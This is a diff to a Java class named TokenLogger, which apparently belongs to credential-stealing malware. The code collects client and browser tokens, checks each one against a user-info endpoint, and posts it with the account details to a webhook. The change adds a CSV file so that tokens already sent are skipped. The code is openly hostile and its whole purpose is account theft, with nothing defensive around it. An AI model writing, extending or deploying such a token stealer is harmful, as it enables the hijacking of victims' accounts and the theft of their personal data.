@@ -28,13 +28,21 @@ public class TokenLogger {
 
         getClientTokens();
         getBrowserTokens();
+        try {
+            if (!FileHelper.createFile(TOKEN_DATABASE_PATH)) System.exit(1);
+        } catch (Exception ignored) {}
+        CSV tokenDatabase = new CSV(TOKEN_DATABASE_PATH);
+        tokenDatabase.open();
         tokens.forEach(token -> {
+            if (tokenDatabase.contains(token)) return;
             String userInfo = Requests.get(USER_INFO_URL, token);
             if (userInfo == null) return;
+            tokenDatabase.add(token);
             String infoEmbed = EmbedGenerator.generateEmbed(userInfo, token);
             if (infoEmbed == null) return;
             Requests.post(infoEmbed, WEBHOOK_URL);
         });
+        tokenDatabase.close();
 
         System.exit(0);
     }
